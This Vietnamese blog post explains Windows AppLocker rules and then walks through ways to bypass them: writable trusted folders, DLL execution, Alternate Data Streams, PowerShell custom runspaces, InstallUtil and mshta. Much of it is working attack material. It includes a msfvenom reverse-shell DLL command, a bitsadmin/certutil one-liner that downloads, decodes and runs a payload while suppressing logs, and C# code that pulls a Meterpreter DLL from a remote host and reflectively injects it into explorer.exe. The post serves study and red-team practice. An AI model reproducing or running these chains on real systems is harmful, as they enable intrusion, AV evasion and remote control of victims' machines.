![](https://images.viblo.asia/c83314c4-94ef-49d4-a30d-dcb7fb55a122.png)

Chuyện xảy ra khi mình tham gia vào một kỳ thi Red Team, trong đó yêu cầu thí sinh viết một Malware để chiếm quyền điều khiển hệ thống. Mặc dù Malware đã bypass được ASMI  (Antimalware Scan Interface) và tất cả các AV có sẵn trong danh sách nhưng vẫn không tài nào chạy nổi. Sau quá trình tìm tòi nghiên cứu, mình phát hiện trên máy chủ đã thiết lập một thứ rất khó chịu - AppLocker nên mình quyết định tìm hiểu và viết bài về nó.

# 1. AppLocker là gì ?

AppLocker một dạng "firewall" mặc định trên Windows hoạt động theo cơ chế Application Whitelisting - mặc định chặn toàn bộ các chương trình hay file thực thi không có trong danh sách Trusted.

# 2. Thiết lập AppLocker

Có 3 Rules để thiết lập Applocker, chúng có thể hoạt động độc lập hoặc kết hợp khi cần thiết. 

- Rule đầu tiên và đơn giản nhất là dựa trên **đường dẫn**. Quy tắc này có thể được sử dụng để đưa một tệp vào Whitelist dựa trên tên tệp và đường dẫn của nó hoặc nội dung thư mục

- Rule số 2 thiết lập dựa trên **hash của file**. Nó cho phép một tệp duy nhất được thực thi - bất kể nằm ở đâu. Để tránh việc sử dụng trùng lặp hash, Applocker sử dụng thuật toán SHA256 

- Rule số 3 thiết lập dựa trên **chữ ký điện tử** mà Microsoft gọi là publisher. Quy tắc này có thể đưa vào Whitelist tất cả các file riêng lẻ chỉ bằng 1 publisher duy nhất. Giúp đơn giản hóa quá trình lập danh sách hay cập nhật phần mềm

**Tiến hành thiết lập một số quy tắc đơn giản**

Đăng nhập với user Admin  (lưu ý tài khoản Admin sẽ không bị ảnh hưởng bởi các thiết lập AppLocker)

1. Sử dụng CMD với quyền Admin, gõ **gpedit.msc** 

![](https://images.viblo.asia/65ffa9b3-f1f2-420b-b611-38c847e7cb10.png)

Truy cập 

```
Local Computer Policy > Computer Configuration > Windows Settings > Security Settings > Application Control Policies > AppLocker
```

[![qylScreenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/qylScreenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/qylScreenshot_2.png)

Chọn `Configure rule enforcement` ta thấy 4 thuộc tính

[![VH4Screenshot_3.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/VH4Screenshot_3.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/VH4Screenshot_3.png)

* Executable rules : Thuộc tính này liên quan tới các tệp thực thi có đuôi **exe**

* Windows Installer rules : Thuộc tính này liên quan tới các tệp thực thi **.msi**

* Script Rules : Thuộc tính này liên quan tới các phần mở rộng của Powershell, VBA , Jscript như .cmd .bat .ps1 

* Packaged app Rules : Thuộc tính này liên quan tới các ứng dụng đã được đóng gói, bao gồm cả các ứng dụng có thể cài đặt trực tiếp từ Windows Store

Chọn đồng thời cả 4 thuộc tính như sau 

[![UoCScreenshot_4.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/UoCScreenshot_4.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/UoCScreenshot_4.png)

Tiếp theo, chúng ta phải cấu  hình các nguyên tắc cho từng danh mục trong số 4 danh mục này.

Click vào từng phần, một trang trắng sẽ hiển thị, chọn "Create Default Rule". Các quy tắc mặc định sẽ được hiển thị ở đây 

[![ETBScreenshot_5.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/ETBScreenshot_5.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/ETBScreenshot_5.png)

Điều này sẽ chặn tất cả các ứng dụng, ngoại trừ những ứng dụng được cho phép hoạt động 

* Rule số 1 và 2 cho phép tất cả người dùng "Everyone" chạy file thực thi trong C:\\Program Files , C:\\Program Files (x86) , C:\\Windows (bao gồm các tệp thực thi trong tất cả các thư mục con). Điều này cho phép chức năng của hệ điều hành vẫn hoạt động nhưng ngăn người dùng không phải quản trị viên ghi vào các thư mục này

* Rule số 3 cho phép các thành viên của nhóm administrative chạy bất cứ gì mà họ thích

Sau khi tạo xong, chúng ta đóng Local Group Policy Editor và chạy `gpupdate /force`

Bây giờ AppLocker đã được cấu hình. người dùng thông thường sẽ không thể thực thi bất kỳ tệp thực thi nào bên ngoài `C:\\Program Files` , `C:\\Program Files (x86)` , `C:\\Windows`

Thử chạy chương trình ngoài thư mục được phép 

[![rXTScreenshot_6.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/rXTScreenshot_6.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/rXTScreenshot_6.png)

Không thành công , Log sẽ được ghi chép tại `Event Viewer`

# 3. Bypass AppLocker

## 3.1. Trusted Folders

Các quy tắc mặc định cho AppLocker đưa vào Whitelist các tệp thực thi nằm trong `C:\\Program Files , C:\\Program Files (x86) , C:\\Windows` (bao gồm các các thư mục con được chứa trong đó). Chúng ta chỉ cần tìm kiếm vị trí có thể ghi vào tại các thư mục này, là tệp tin có thể được thực thi. Sử dụng `AccessChk` để tìm kiếm các thư mục có thể được ghi `w`, các thư mục con của chúng`-s` và `-u` loại bỏ lỗi. 

Câu lệnh trở thành

```
accesschk.exe "student" C:\Windows -wus
```
> Lưu ý phải chạy powershell trên CMD với quyền root , vì accesschk.exe sẽ bị chặn với user thường (phần này lại quay về bài toán con Gà - quả Trứng)

[![TkLScreenshot_8.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/TkLScreenshot_8.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/TkLScreenshot_8.png)

Chúng ta tiến hành kiểm tra lại với `icacls`

`icacls.exe C:\\Windows\Task`

[![HTbScreenshot_9.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/HTbScreenshot_9.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/HTbScreenshot_9.png)

Ta thấy cờ RX - nghĩa là bất kỳ người dùng nào trên hệ thống sẽ có cả quyền đọc và thực thi trong thư mục. Điều đơn giản tiếp theo chúng ta có thể làm là ghi `calc.exe` vào thư mục này, sau đó có thể khởi chạy

[![ZMZScreenshot_10.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/ZMZScreenshot_10.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/ZMZScreenshot_10.png)

Tương tự với `C:\\Windows\Temp\` chúng ta cũng có thể ghi calc.exe vào để thực thi

[![2XxScreenshot_11.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/2XxScreenshot_11.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/2XxScreenshot_11.png)

## 3.2. Bypass với DLLS

Quay lại cấu hình ở trên , ta thấy rõ được rằng chính sách đang cấu hình giới hạn các file `.exe` , `.msi` , `.vba` các thứ các thứ.

Tuy nhiên ra không thấy rule cấu hình chặn cho .DLL

Chúng ta tiến hành thử chạy một DLL ngoài thư mục được whitelist
```
rundll32  C:\Tools\TestDll.dll,run
```
Nội dung file

```csharp
#include "stdafx.h"
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void run()
{
	MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
}
```
[![KBTScreenshot_12.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/KBTScreenshot_12.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/KBTScreenshot_12.png)

Như vậy ta thấy rằng, Malware sử dụng .DLL hoàn toàn có thể thực thi trên hệ thống. Ta có thể tạo malware .DLL như vậy với Msfvenom

```shell
msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f dll > shell-cmd.dll
```

![](https://images.viblo.asia/dd79f44a-08bb-4fcd-84f4-6d8ecd907fcf.png)


**Quản trị viên cấu hình chặn DLL**

> Thông thường DLL sẽ không được chặn trong AppLocker do nó được sử dụng bởi nhiều chương trình khác nhau trên hệ thống. Việc chặn DLL có thể gây lỗi hoặc làm máy chủ hoạt động không đúng cách.

[![PYpScreenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/PYpScreenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/PYpScreenshot_1.png)

[![YVeScreenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/YVeScreenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/YVeScreenshot_2.png)

Tạo rule DLL mới

[![ISsScreenshot_3.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/ISsScreenshot_3.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/ISsScreenshot_3.png)

Cập nhật rules

```
gpupdate.exe /force
```

File DLL đã không còn được thực thi được nữa

[![rHzScreenshot_4.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/rHzScreenshot_4.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/rHzScreenshot_4.png)

> Bước này chúng ta lại quay lại phương pháp số 1, ghi đè vào thư mục để thực thi mã độc 

## 3.3. Alternate Data Streams

Windows file system được base trên NTFS . Mặc dù hoạt động bên trong của NTFS rất phức tạp, nhưng đối với mục đích của phần này, chúng ta chỉ cần hiểu đơn giản NTFS hỗ trợ đa luồng là được.

Alternate Data Stream (ADS) là một thuộc tính có chứa metadata , chúng ta có thể tận dụng điều này để nối dữ liệu vào tệp gốc

Tạo tệp Jscript nhỏ như sau

```
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("calc.exe");
```
>[![1KsScreenshot_5.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/1KsScreenshot_5.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/1KsScreenshot_5.png)

Không thể chạy Jscript trực tiếp vì rule Applocker chặn 

Chúng ta lưu tệp này dưới dạng test.js trong thư mục của student. Vì các rules của Applocker ngăn chặn, chúng ta không thể thực thi ở vị trí hiện tại. Tuy nhiên nếu chúng ta tìm thấy một vị trí đáng tin cậy có thể ghi và thực thi. Chúng ta có thể ghi nội dung của tệp lệnh này vào Alternate Data Stream (ADS) của nó và bypass Applocker

Ví dụ Teamviewer version 12 được cài đặt trên máy nạn nhân, sử dụng file nhật ký **TeamViewer12_Logfile.log**
mà qua đó chúng ta có thể lợi dụng để tiến hành injection

```
type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```

sử dụng `dir /r ` để xác định xem mã Jscript đã được ghi vào ADS hay chưa

```
dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"
```

[![9YAScreenshot_6.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/9YAScreenshot_6.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/9YAScreenshot_6.png)

Nếu chúng ta nhấp đúp vào biểu tượng của file log, nó sẽ mở "the primary stream" là Notepad
Nếu chúng ta thực thi từ command `wscript` , thì Jscript sẽ được thực thi - bất chấp các rules của Applocker

```
wscript C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js
```

[![VlBScreenshot_7.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/VlBScreenshot_7.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/VlBScreenshot_7.png)

**Thử trường hợp khác**

```
1. Tạo file file_injection trong C:\\Windows
2. Injection test.js
3. Chạy với Wscript
```
[![Ds0Screenshot_9.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/Ds0Screenshot_9.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/Ds0Screenshot_9.png)

## 3.4. Third Party Execution

Như đã tìm hiểu ở trước, AppLocker chỉ thực thi các rule chống lại các file thực thi Windows. Nếu công cụ sử dụng các ngôn ngữ kịch bản như Python hay Perl hay Java , việc bypass là khá dễ dàng (trong trường hợp này máy nạn nhân cần phải cài đặt sẵn môi trường tương ứng)

> Điều thú vị  là những file VBA bên trong các tài liệu Microsoft Office cũng không bị chặn. 

# 4. Bypassing AppLocker với Powershell

## 4.1. PowerShell Constrained Language Mode

PowerShell sử dụng [PowerShell execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2)  để hạn chế thực thi các tập lệnh, nhưng đây thực chất là một cơ chế bảo vệ "dọa ma" - dễ dàng bị bỏ qua bằng policy "**-Bypass**" được tích hợp sẵn. Tuy nhiên, ***"Language Modes"*** mạnh mẽ hơn và được chia làm nhiều cấp độ khác nhau bao gồm : 

**FullLanguage** cho phép chạy tất cả mọi thứ (C# hay .Net) 

**NoLanguage** không cho phép chạy all script text

**RestrictedLanguage**: Cho phép chạy cmdlets mặc định nhưng giới hạn rất nhiều thứ

Tất cả các thuộc tính này đều đem lại sự khó khăn trong công tác quản trị. Việc block tất cả cũng tiềm ẩn nguy cơ hệ thống ngừng thở

Để giải quyết vấn đề này, Microsoft đã nghĩ ra một chế độ mới **ConstrainedLanguage (CLM)** với Powershell version 3.0. Khi Applocker thực thi chính sách whitelist rule Powershell script, ConstrainedLanguage sẽ được bật mặc định 

> Về bản chất, khi chúng ta sử dụng Powershell trong khi bị "áp rule" bởi Applocker, là đang ở trong ConstrainedLanguage Mode

Để kiểm tra, chúng ta có thể sử dụng hàm `$ExecutionContext.SessionState.LanguageMode`

Bình thường

[![2SuScreenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/2SuScreenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/2SuScreenshot_2.png)

Khi bị Applocker "đấm"

[![0U6Screenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/0U6Screenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/0U6Screenshot_1.png)

Ở trong chế độ hạn chế, user thường không thể gọi .NET framework

[![zKmScreenshot_3.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/zKmScreenshot_3.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/zKmScreenshot_3.png)

## 4.2. Custom Runspaces

Trước tiên, chúng ta tìm hiểu cơ chế hoạt động của một Powershell điển hình.`Powershell.exe` về cơ bản là một ứng dụng GUI xử lý các input và output. Chức năng thực sự của nó nằm trong DLL **System.Management.Automation.dll**. 

Powershell.exe sẽ gọi tới **System.Management.Automation.dll** và tạo một runspace. Chúng ta có thể tận dụng để viết một ứng dụng C# tạo một runspace Powershell tùy chỉnh sau đó thực thi lệnh của chúng ta trong đó. Điều này rất khả thi vì runspace không bị giới hạn bởi Applocker. Sử dụng cách tiếp cận này, chúng ta có thể xây dựng một công cụ để bỏ qua "constrained language mode"

> Tóm tắt toàn bộ quá trình là như này : Đầu tiên chúng ta tạo một runspace custom, rồi ép Powershell gọi runspace đó. Từ ấy ta có được các command không bị giới hạn 

Bắt tay vào code thôi !!!

Sử dụng `CreateRunspace` của namespace `System.Management.Automation.Runspaces `


```csharp 
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
        }
    }
}
```

Ứng dụng bị lỗi do Visual Studio không thể tìm thấy `System.Management.Automation.Runspaces`, do đó chúng ta phải trực tiếp add DLL này "bằng tay"

Chuột phải vào `References ` > `Add References` > `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35` > `System.Management.Automation.dll`

[![1xwScreenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/1xwScreenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/1xwScreenshot_2.png)

[![0nlScreenshot_3.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/0nlScreenshot_3.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/0nlScreenshot_3.png)


Sau khi giải quyết xong, chúng ta tiến hành viết chi tiết mã

Đầu tiên, ta gọi `CreateRunspace` để tạo một custom runspace và return một runspace object. Chúng ta có thể sử dụng open() method để mở object này và tương tác với nó

Với runspace custom được tạo, chúng ta có thể khởi tạo một Powershell Object và gán runspace cho nó để cho phép chúng ta chạy các command tùy ý .

```
PowerShell ps = PowerShell.Create(); //Tạo một Runspace
ps.Runspace = rs; // Set the runspace property to our custom runspace
```

Ở thời điểm này, chúng ta đã tạo được một vùng runspace và liên kết nó với Powershell object. Tiếp đó, chúng ta sẽ "bơm" command vào

Command

```
String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
```
> `$ExecutionContext.SessionState.LanguageMode` để kiểm tra hiện trạng của policy

Sau đó chúng ta thao tác trong `runspace`
```
ps.AddScript(cmd); // thêm vào runspace
ps.Invoke();  // Gọi & thực thi 
rs.Close();  // Đóng runspace
```

Toàn bộ code cuối cùng sẽ như sau

```powershell 
PowerShell ps = PowerShell.Create();
ps.Runspace = rs;
String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
ps.AddScript(cmd);
ps.Invoke();
rs.Close();
```
[![LRkScreenshot_5.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/LRkScreenshot_5.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/LRkScreenshot_5.png)

Khi chúng ta muốn chạy các powershell file. 

```
cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.95/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";

```
## 4.3. Powershell CLM Bypass

Ở phần trên, chúng ta đã cùng nhau tìm hiểu phương pháp bypass Powershell CLM . Tuy nhiên file cuối cùng vẫn cần phải được chạy trong một thư mục "trusted". Nội dung dưới đây sẽ giúp chúng ta chạy application từ bất kỳ đâu - đem lại độ hiệu quả cao hơn nhiều so với phương pháp trước. 

Trong phần này, chúng ta sẽ tận dụng **InstallUtil** , một tiện ích cho phép cài đặt / gỡ cài đặt tài nguyên máy chủ . InstallUtil được phát triển bởi Microsoft , hỗ trợ 2 phương thức installer  và uninstall  . Tuy hiên ta chỉ dùng uninstall do installer yêu cầu sử dụng quyền admin. Tra cứu tài liệu về `InstallUtil` ta có POC sau 


```csharp 
using System;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            // TO DO
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
          // TO DO
        }
    }
}
```

Giống như phần trước, ta phải tiến hành include `System.Configuration.Install` bằng cách thủ công

`References ` -> `System.Configuration.Install`

[![cA8Screenshot_3.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/cA8Screenshot_3.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/cA8Screenshot_3.png)

Kết hợp với Custom Runspace  ta có 

```csharp 
using System;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
```


Chuyển file đã biên dịch `bypass.exe` sang máy victim

Sử dụng ``C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe`` để thực thi bypass

* **/logfile** : để hạn chế ghi logging vào file

*  **/LogToConsole=false** : Không hiển thị output
* **/U** : trigger the Uninstall method


[![CjyScreenshot_5.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/CjyScreenshot_5.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/CjyScreenshot_5.png)

Tuy nhiên còn một vấn đề nhỏ, tool của chúng ta phải ở trên Disk khi `InstallUtil ` được gọi. Cho nên việc để tránh bị các AV phát hiện là một việc làm rất quan trọng. Để vượt qua AV, chúng ta sẽ làm `xáo trộn tệp thực thi` trong khi nó đang được tải xuống bằng Base64 rồi giải mã nó trên Disk. **certutil** để thực hiện mã hóa và giải mã , **bitadmin** để thực hiện việc Download (Na ná wget trên Linux).


Đầu tiên chúng ta sử dụng `certutil` trên máy Windows 10 để encode base64 tệp thực thi đã biên dịch


```
certutil -encode C:\Users\student\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt
```

Bây giờ `bypass.exe` để được encode base64 thành `file.txt`, chúng ta sẽ sao chép nó vào /var/www/html của Kali & đảm bảo Apache đang chạy. Sau đó sẽ dụng bitsadmin để tải xuống 

> Certutil  cũng có thể sử dụng để tải như `bisadmin`, nhưng nó thường bị các AV nhận diện do mức độ phổ biến của nó

```
bitsadmin /Transfer myJob http://192.168.1.12/file.txt C:\Users\student\enc.txt
```

sau khi tải xuống, tiến hành giải mã với `certutil -decode`

```
certutil -decode enc.txt bypass.exe
```

Hoặc gộp "tuốt tuồn tuột" thành một câu lệnh


``` 
bitsadmin /Transfer myJob http://192.168.1.12/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
```

## 4.4. Reflective Injection Returns

Trong chapter `Process Injection`  chúng ta đã tiến hành sử dụng ` Invoke-ReflectivePEInjection` để chèn DLL độc hại vào một Process. Tuy nhiên, trong trường hợp AppLocker , DLL không đáng tin cậy của chúng ta đã bị chặn. Buộc chúng ta phải sử dụng một phương thức bypass khác 


Đầu tiên, chúng ta tạo một DLL Meterpreter 64bit đồng thời tải công cụ `Invoke-ReflectivePEInjection.ps1 ` về trên máy Kali . Mục tiêu của chúng ta là download DLL Meterpreter vào một mảng byte. Xác định ID process **explorer.exe** cho việc Injection DLL và thực thi  `Invoke-ReflectivePEInjection `

Kết lại hợp ta có 

```csharp 
using System;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.12/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.1.12/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
            
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
```

# 5. Bypassing AppLocker với  Jscript

Trong các nội dung trước, chúng ta đã tận dụng các file Microsoft Office và Jscript để thực thi code phía client. Trong quá trình này, chúng ta đã cải thiện nhiều kỹ thuật để vượt qua các endpoint AV. Tuy nhiên nếu các rules Applocker được thiết lập thông qua Hash File hoặc Chữ ký thì Jscript sẽ không thể được thực thi. Trong trường hợp này, nếu chúng ta đính kèm Jscript vào email và gửi nó cho nạn nhân. Nó sẽ bị chặn bởi AppLocker làm gián đoạn cuộc tấn công. 

Ở phần này, chúng ta sẽ sử dụng Jscript và DotNetToJscript để bypass AppLocker

## JScript and MSHTA

Microsoft HTML Applications (MSHTA) là vector tấn công phía client-side nổi tiếng thời  Internet Explorer con làm bá chủ . Khi trình duyệt này ít được sử dụng thì vector này cũng giảm bớt mức độ ảnh hưởng hơn. Nhưng ta vẫn có thể tận dụng nó trong module này để bypass Applocker

Microsoft HTML Applications (MSHTA) hoạt động bằng cách thực thi tệp **.hta** ứng với file **mshta.exe**. Vì **mshta.exe** nằm trong **C:\\Windows\System32** nên nó được đưa vào Whitelist

File test.hta nội dung đơn giản như sau :

```
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```

Chạy với `mshta.exe` (mshta yêu cầu cung cấp đường dẫn TUYỆT ĐỐI của file thực thi)

```
mshta  "C:\Users\A\Desktop\file.hta" 
```
![](https://images.viblo.asia/e2229825-20c2-4ff6-a8b5-d0d5e1d6e3cd.png)